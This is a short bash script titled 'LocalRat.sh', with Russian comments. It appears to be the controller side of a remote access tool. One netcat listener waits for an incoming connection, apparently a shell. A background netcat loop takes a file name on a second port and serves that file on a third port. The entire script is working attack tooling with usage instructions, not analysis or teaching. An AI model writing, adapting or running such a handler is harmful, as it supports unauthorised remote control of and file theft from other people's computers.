#!/bin/bash -

# Shebang
 
# start not from root. Not id "0"
# Usage:  LocalRat.sh  port1 [port2 [port3]]

function bgfilexfer ()   # Определяю фоновый демон передачи файлов

{
    while true
    do
        FN=$(nc -nlvvp $LOCALPORT2 2>>/tmp/x2.err)   # Слушаю второй номер порта 2, errors >> stdout 
        if [[ $FN == 'exit' ]] ; then exit ; fi     
        nc -nlp $LOCALPORT3 < $FN                                     
    done
}

# -------------------- main ---------------------
LOCALPORT=$1
LOCALPORT2=${2:-$((LOCALPORT+1))}
LOCALPORT3=${3:-$((LOCALPORT2+1))}


bgfilexfer &                              # запускаю демон фоновой передачи файлов        


nc -nlvp $LOCALPORT                        # слушаю входящее соединение           
